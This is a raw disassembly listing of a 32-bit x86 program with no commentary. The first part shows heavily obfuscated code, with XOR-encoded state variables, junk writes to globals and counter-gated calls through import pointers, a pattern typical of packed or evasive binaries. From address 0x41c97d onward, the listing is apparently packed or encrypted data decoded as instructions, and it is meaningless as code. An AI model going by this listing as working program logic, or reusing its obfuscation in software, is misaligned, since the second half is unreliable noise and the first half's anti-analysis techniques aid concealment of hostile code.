  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x42352e
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x42363d
  41c68d:	push   0x423654
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42173a
  41c725:	mov    ecx,DWORD PTR ds:0x42351a
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0xe280d858
  41c98a:	or     al,BYTE PTR [edx+0x7]
  41c98d:	loope  0x41c98c
  41c98f:	popa   
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx-0xd]
  41c996:	scas   eax,DWORD PTR es:[edi]
  41c997:	clc    
  41c998:	dec    esi
  41c999:	cmp    al,0x3
  41c99b:	jmp    0x32c2:0x6d4f45f5
  41c9a2:	add    ebp,DWORD PTR [edx]
  41c9a4:	xor    eax,0xaede3f99
  41c9a9:	adc    DWORD PTR [esi],esp
  41c9ab:	or     ebp,0x1
  41c9ae:	sub    BYTE PTR [esi-0x516a3c48],0x73
  41c9b5:	and    eax,DWORD PTR [esi-0x88cc252]
  41c9bb:	adc    eax,0x14860195
  41c9c0:	sub    esp,DWORD PTR es:[ebx]
  41c9c3:	inc    esi
  41c9c4:	ror    DWORD PTR [edx-0x44fb2cf4],1
  41c9ca:	xchg   ecx,eax
  41c9cb:	xchg   edx,eax
  41c9cc:	xchg   ah,al
  41c9ce:	fcmovnb st,st(6)
  41c9d0:	jo     0x41c9cb
  41c9d2:	push   eax
  41c9d3:	fild   WORD PTR [esi+0x1b]
  41c9d6:	jae    0x41ca1c
  41c9d8:	in     al,dx
  41c9d9:	(bad)  
  41c9da:	mov    esp,0x3a7cd81d
  41c9df:	pop    edx
  41c9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9e1:	or     bh,al
  41c9e3:	mov    eax,0x6311d742
  41c9e8:	sbb    ebx,DWORD PTR [edi+0x1c512081]
  41c9ee:	nop
  41c9ef:	mov    edx,0xed3e584b
  41c9f4:	xchg   BYTE PTR [edi-0x49],al
  41c9f7:	(bad)  
  41c9f9:	scas   eax,DWORD PTR es:[edi]
  41c9fa:	jnp    0x41c9c0
  41c9fc:	sub    al,0x2d
  41c9fe:	pop    ds
  41c9ff:	lods   al,BYTE PTR ds:[esi]
  41ca00:	pop    es
  41ca01:	sbb    al,0x3e
  41ca03:	sub    eax,0xcf403621
  41ca08:	xor    DWORD PTR [eax-0x43c61258],ecx
  41ca0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca0f:	dec    BYTE PTR [edi+0x2a180599]
  41ca15:	stc    
  41ca16:	ins    BYTE PTR es:[edi],dx
  41ca17:	sub    eax,0xc03776a2
  41ca1c:	test   eax,0xb675493b
  41ca21:	popa   
  41ca22:	inc    ecx
  41ca23:	adc    bl,BYTE PTR [eax]
  41ca25:	cmp    dh,0x58
  41ca28:	cwde   
  41ca29:	and    eax,0x49e55edf
  41ca2e:	sar    BYTE PTR [edx+0xd],1
  41ca31:	shr    DWORD PTR ds:[edx-0x7b],cl
  41ca35:	inc    edi
  41ca36:	xchg   ebp,ecx
  41ca38:	mov    ch,0x79
  41ca3a:	or     eax,0x4043aaef
  41ca3f:	xchg   BYTE PTR [edi-0x70],al
  41ca42:	adc    al,0x6
  41ca44:	xlat   BYTE PTR ds:[ebx]
  41ca45:	fdiv   QWORD PTR [eax-0x3d0df54a]
  41ca4b:	sub    ch,BYTE PTR [esi+ebx*8]
  41ca4e:	outs   dx,BYTE PTR ds:[esi]
  41ca4f:	sti    
  41ca50:	sbb    dh,BYTE PTR [edx-0x5c87f094]
  41ca56:	sbb    BYTE PTR [eax+0x5a4dd5c7],ch
  41ca5c:	cld    
  41ca5d:	push   0x43
  41ca5f:	pop    ecx
  41ca60:	and    esp,DWORD PTR [ebp+0x31]
  41ca63:	or     esi,DWORD PTR [eax]
  41ca65:	mov    eax,ds:0x3be88d4f
  41ca6a:	push   0xffffff8a
  41ca6c:	test   DWORD PTR [ebp-0x74],0x7687f07
  41ca73:	sbb    DWORD PTR [ebx-0x7f],ebp
  41ca76:	cs ins DWORD PTR es:[edi],dx
  41ca78:	pop    esp
  41ca79:	(bad)  
  41ca7b:	into   
  41ca7c:	sar    ebx,cl
  41ca7e:	pop    edi
  41ca7f:	pop    ebx
  41ca80:	pop    es
  41ca81:	test   eax,0x39980e29
  41ca86:	push   ss
  41ca87:	invlpg BYTE PTR ds:0x871ce969
  41ca8e:	fadd   DWORD PTR [esi-0x1b]
  41ca91:	cs ss sub al,0x7
  41ca95:	jne    0x41cab2
  41ca97:	lea    edi,[edx]
  41ca99:	mov    edi,0x608d284d
  41ca9e:	ret    
  41ca9f:	call   0x63215dfd
  41caa4:	mov    eax,DWORD PTR [esi]
  41caa6:	popa   
  41caa7:	cmp    DWORD PTR [eax+ebx*1-0x44025e92],esp
  41caae:	pop    edx
  41caaf:	stos   BYTE PTR es:[edi],al
  41cab0:	or     ebp,DWORD PTR [esp+ebp*1+0x4c]
  41cab4:	or     eax,esi
  41cab6:	mov    WORD PTR [eax+0x4f750474],gs
  41cabc:	add    ah,BYTE PTR [ebp+0x3c]
  41cabf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cac0:	lods   eax,DWORD PTR ds:[esi]
  41cac1:	mov    fs,WORD PTR [ebx+0x4]
  41cac4:	ret    0xf054
  41cac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac8:	mov    cl,0x5d
  41caca:	idiv   dh
  41cacc:	int    0x3f
  41cace:	out    dx,eax
  41cacf:	or     DWORD PTR [ebp+0x59efbc9e],0x3e75f54f
  41cad9:	imul   esp,DWORD PTR [edx-0x75],0xfffffff4
  41cadd:	fucomip st,st(0)
  41cadf:	lea    ebx,[ebp+0x7a]
  41cae2:	inc    esi
  41cae4:	in     al,0xcc
  41cae6:	pop    ecx
  41cae7:	jp     0x41cb4f
  41cae9:	cld    
  41caea:	sbb    eax,0xfe7cfb1a
  41caef:	repz mov dh,0x42
  41caf2:	or     al,0x2
  41caf4:	loop   0x41ca85
  41caf6:	cmp    eax,0x65d3cc15
  41cafb:	xchg   edx,eax
  41cafc:	es xchg ecx,eax
  41cafe:	inc    edi
  41caff:	dec    edi
  41cb00:	idiv   DWORD PTR [ebx-0x22]
  41cb03:	jmp    0x41cb6b
  41cb05:	aaa    
  41cb06:	in     al,0xc8
  41cb08:	not    ebp
  41cb0a:	imul   eax,DWORD PTR [eax],0xf0228afd
  41cb10:	retf   
  41cb11:	in     al,dx
  41cb12:	add    ebp,DWORD PTR [ebp+0x3a]
  41cb15:	mov    ch,0xaf
  41cb17:	or     edi,DWORD PTR [esp+ebp*4-0x15e1c876]
  41cb1e:	adc    BYTE PTR [esi-0x1ecb7b2c],0x16
  41cb25:	bound  ecx,QWORD PTR [ebx]
  41cb27:	shl    DWORD PTR [eax-0x49],cl
  41cb2a:	pushf  
  41cb2b:	(bad)  
  41cb2c:	cmp    ebp,edx
  41cb2e:	jae    0x41cba5
  41cb30:	dec    edi
  41cb31:	gs addr16 mov al,0x89
  41cb35:	sbb    BYTE PTR [esi-0x60402a4f],bl
  41cb3b:	aas    
  41cb3c:	sub    eax,0xb358a752
  41cb41:	repnz mov esp,0x8d52d3a6
  41cb48:	push   esi
  41cb49:	add    ah,bh
  41cb4b:	out    0x19,eax
  41cb4d:	xchg   edi,eax
  41cb4e:	outs   dx,BYTE PTR ds:[esi]
  41cb4f:	pop    edi
  41cb50:	aaa    
  41cb51:	stc    
  41cb52:	retf   
  41cb53:	out    dx,al
  41cb54:	or     DWORD PTR [edx],0xffffffd2
  41cb57:	pop    ss
  41cb58:	push   esp
  41cb59:	jecxz  0x41cb8a
  41cb5b:	mov    al,0xf3
  41cb5d:	xchg   DWORD PTR [eax-0x371d0b87],esi
  41cb63:	dec    ebp
  41cb64:	push   0x6
  41cb66:	gs and al,0xad
  41cb69:	pop    ss
  41cb6a:	adc    DWORD PTR [esi+0xce9403c],esi
  41cb70:	icebp  
  41cb71:	sbb    BYTE PTR ds:0x760705c,cl
  41cb77:	loopne 0x41cb5a
  41cb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7a:	and    al,0xc9
  41cb7c:	push   cs
  41cb7d:	xchg   esi,eax
  41cb7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb7f:	retf   0xb0b8
  41cb82:	mov    ebx,0x8b9ee40
  41cb87:	jno    0x41cbd3
  41cb89:	retf   0xf973
  41cb8c:	test   eax,0x5114a74
  41cb91:	dec    edi
  41cb92:	xchg   edx,eax
  41cb93:	inc    ebp
  41cb94:	and    ch,dh
  41cb96:	mov    cl,0xd2
  41cb98:	and    DWORD PTR [eax+0x1f],ebx
  41cb9b:	xor    eax,0xd98b7314
  41cba0:	aam    0x44
  41cba2:	daa    
  41cba3:	pop    esi
  41cba4:	mov    bh,0xfe
  41cba6:	lahf   
  41cba7:	scas   eax,DWORD PTR es:[edi]
  41cba8:	adc    eax,0xd5db9cd2
  41cbad:	shr    DWORD PTR [edi],1
  41cbaf:	add    al,0xf6
  41cbb1:	leave  
  41cbb2:	ror    esp,cl
  41cbb4:	fldenv [edx]
  41cbb6:	ins    BYTE PTR es:[edi],dx
  41cbb7:	add    al,0x80
  41cbb9:	sbb    al,0x7a
  41cbbb:	scas   al,BYTE PTR es:[edi]
  41cbbc:	cmovle ebx,DWORD PTR [esi+0x77]
  41cbc0:	dec    ecx
  41cbc1:	cli    
  41cbc2:	inc    esp
  41cbc3:	sub    eax,0xbb7c7d8c
  41cbc8:	xchg   edi,eax
  41cbc9:	add    ecx,DWORD PTR [ebp+eiz*1+0x2ec4b65f]
  41cbd0:	mul    cl
  41cbd2:	fnstenv [edi+0x5aabf85c]
  41cbd8:	fdivr  DWORD PTR [ebp-0x15763e68]
  41cbde:	mov    bh,0xdd
  41cbe0:	inc    ebp
  41cbe1:	xchg   esp,eax
  41cbe2:	pop    ss
  41cbe3:	fisttp DWORD PTR [ebp-0x49728200]
  41cbe9:	dec    esp
  41cbea:	lods   eax,DWORD PTR ds:[esi]
  41cbeb:	ret    
  41cbec:	sub    BYTE PTR fs:0xafc48741,bl
  41cbf3:	sbb    dl,ah
  41cbf5:	ins    DWORD PTR es:[edi],dx
  41cbf6:	test   al,0x69
  41cbf8:	scas   al,BYTE PTR es:[edi]
  41cbf9:	jae    0x41cc14
  41cbfb:	mov    ecx,0x7e2ac1c4
  41cc00:	inc    DWORD PTR [eax+0x2d]
  41cc03:	inc    esp
  41cc04:	mov    esi,0x1dd6a6c9
  41cc09:	aaa    
  41cc0a:	jp     0x41cbd4
  41cc0c:	push   esp
  41cc0d:	add    DWORD PTR [ebp+0x9],ebp
  41cc10:	dec    edi
  41cc11:	scas   eax,DWORD PTR es:[edi]
  41cc12:	mov    cl,0x95
  41cc14:	out    dx,eax
  41cc15:	(bad)  
  41cc16:	cmc    
  41cc17:	std    
  41cc18:	jo     0x41cbdd
  41cc1a:	rol    BYTE PTR cs:[edi-0x78],0xb4
  41cc1f:	sbb    DWORD PTR [eax],0x2e
  41cc22:	fist   DWORD PTR [esi+0x71869510]
  41cc28:	out    dx,eax
  41cc29:	jp     0x41cbc9
  41cc2b:	push   ds
  41cc2c:	lds    ecx,FWORD PTR [eax-0x57]
  41cc2f:	leave  
  41cc30:	aaa    
  41cc31:	sti    
  41cc32:	mov    cs,WORD PTR [eax-0x3e43fee0]
  41cc38:	pop    ebx
  41cc39:	std    
  41cc3a:	clc    
  41cc3b:	xor    ecx,esi
  41cc3d:	data16 test BYTE PTR [ecx-0x1c8584ce],cl
  41cc44:	ja     0x41cc5c
  41cc46:	inc    ebp
  41cc47:	mov    ebp,0x79aa75a1
  41cc4c:	pushf  
  41cc4d:	xchg   BYTE PTR [esi-0x5],ah
  41cc50:	mov    esp,DWORD PTR [ebp+0x3ffbe6b4]
  41cc56:	lods   al,BYTE PTR ds:[esi]
  41cc57:	sub    al,0x9
  41cc59:	aam    0x6b
  41cc5b:	xchg   esp,eax
  41cc5c:	mov    bh,0x10
  41cc5e:	mov    gs,WORD PTR [esi+0x49]
  41cc61:	js     0x41cc3d
  41cc63:	mov    dl,0xd0
  41cc65:	xor    eax,0x89cce9ec
  41cc6a:	test   eax,0x5b4e8cc
  41cc6f:	add    eax,0x4b655e15
  41cc74:	mov    edi,0x9bc66922
  41cc79:	push   0x59d489a4
  41cc7e:	sub    al,0x29
  41cc80:	in     al,dx
  41cc81:	cmp    al,0x60
  41cc83:	retf   0x8470
  41cc86:	into   
  41cc87:	shl    DWORD PTR fs:[edi],1
  41cc8a:	jl     0x41cc9a
  41cc8c:	mov    dh,0xdb
  41cc8e:	loopne 0x41cc57
  41cc90:	xor    al,0xbe
  41cc92:	out    0xe3,eax
  41cc94:	out    0x96,al
  41cc96:	push   esp
  41cc97:	inc    edi
  41cc98:	add    BYTE PTR [ebp+0x222a6cb5],bh
  41cc9e:	test   DWORD PTR [eax],0xaacf6491
  41cca4:	push   es
  41cca5:	lods   al,BYTE PTR ds:[esi]
  41cca6:	mov    bh,0x83
  41cca8:	fdivrp st(3),st
  41ccaa:	jge    0x41cd1b
  41ccac:	pop    esp
  41ccad:	jo     0x41ccff
  41ccaf:	xor    DWORD PTR [ebp+0x2c],0x78
  41ccb3:	and    eax,0x62da6fe0
  41ccb8:	scas   al,BYTE PTR es:[edi]
  41ccb9:	jb     0x41cc86
  41ccbb:	adc    esi,DWORD PTR [ebp+0x6e]
  41ccbe:	mov    eax,ds:0x44af9f3c
  41ccc3:	cmp    al,0x93
  41ccc5:	pop    es
  41ccc6:	retf   
  41ccc7:	cmp    DWORD PTR [eax+0x348986d8],esp
  41cccd:	and    BYTE PTR [edx*2+0x48f79c22],bl
  41ccd4:	lahf   
  41ccd5:	push   ds
  41ccd6:	sbb    BYTE PTR [ebp-0x3b4c7ff0],al
  41ccdc:	hlt    
  41ccdd:	mov    BYTE PTR [ecx+0x44],bl
  41cce0:	pop    esi
  41cce1:	mov    eax,ds:0x7b39f26f
  41cce6:	gs push ss
  41cce8:	and    esi,DWORD PTR [edx-0x5e]
  41cceb:	push   ds
  41ccec:	cmp    eax,0xeee3ca91
  41ccf1:	mov    eax,ds:0x4d171de2
  41ccf6:	addr16 inc edi
  41ccf8:	jbe    0x41cccc
  41ccfa:	ret    0x930c
  41ccfd:	into   
  41ccfe:	mov    eax,0x91eaa092
  41cd03:	loopne 0x41cd35
  41cd05:	lods   eax,DWORD PTR ds:[esi]
  41cd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd07:	mov    gs:0xcae5a74a,eax
  41cd0d:	dec    esi
  41cd0e:	js     0x41cd39
  41cd10:	xor    al,0xaf
  41cd12:	add    al,0xdb
  41cd14:	xchg   edi,eax
  41cd15:	or     ah,ah
  41cd17:	inc    edi
  41cd18:	idiv   DWORD PTR [edx]
  41cd1a:	aam    0x4d
  41cd1c:	sbb    BYTE PTR [edx-0x203dd87a],dl
  41cd22:	add    eax,DWORD PTR [eax-0x25]
  41cd25:	bound  ecx,QWORD PTR ds:0xf1cb35f8
  41cd2b:	loop   0x41cd0c
  41cd2d:	aas    
  41cd2e:	dec    ecx
  41cd2f:	jmp    0x41cd8d
  41cd31:	ss cmp ch,bl
  41cd34:	das    
  41cd35:	aas    
  41cd36:	xchg   esp,eax
  41cd37:	hlt    
  41cd38:	mul    DWORD PTR [edi]
  41cd3a:	popf   
  41cd3b:	ins    BYTE PTR es:[edi],dx
  41cd3c:	lahf   
  41cd3d:	xchg   edi,eax
  41cd3e:	frstor [ebx-0x4aa78bdc]
  41cd44:	outs   dx,BYTE PTR ds:[esi]
  41cd45:	adc    al,0x1d
